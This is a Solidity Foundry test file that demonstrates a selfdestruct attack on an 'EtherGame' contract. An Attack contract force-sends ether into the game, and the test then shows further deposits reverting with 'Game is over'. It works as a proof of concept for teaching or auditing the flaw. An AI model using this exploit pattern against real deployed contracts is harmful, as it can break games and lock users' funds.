// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import "forge-std/Test.sol";
import "../src/SelfDestruct.sol";

contract Attack {
    EtherGame etherGame;

    constructor(EtherGame _etherGame) {
        etherGame = EtherGame(_etherGame);
    }

    function exploit() public payable {
        address payable addr = payable(address(etherGame));
        selfdestruct(addr);
    }
}

contract SelfDestructExploit is Test {
    EtherGame EtherGameContract;
    Attack AttackerContract;
    address alice;
    address eve;

    function setUp() public {
        EtherGameContract = new EtherGame();
        alice = vm.addr(1);
        eve = vm.addr(2);
        vm.deal(address(alice), 1 ether);
        vm.deal(address(eve), 1 ether);
    }

    function testSelfdestruct() public {
        console.log("Alice balance: ", alice.balance);
        console.log("Eve balance: ", eve.balance);

        console.log("Alice deposits 1 Ether...");
        vm.prank(alice);
        EtherGameContract.deposit{value: 1 ether}();

        console.log("Eve deposits 1 Ether...");
        vm.prank(eve);
        EtherGameContract.deposit{value: 1 ether}();

        console.log("Balance of EtherGame: ", address(EtherGameContract).balance);

        console.log("Attack...");
        AttackerContract = new Attack(EtherGameContract);
        AttackerContract.exploit{value: 5 ether}();

        console.log("Balance of EtherGame: ", address(EtherGameContract).balance);

        vm.expectRevert(bytes("Game is over"));
        EtherGameContract.deposit{value: 1 ether}(); // Should revert
        console.log("Further deposits revert with error: Game is over");
    }
}
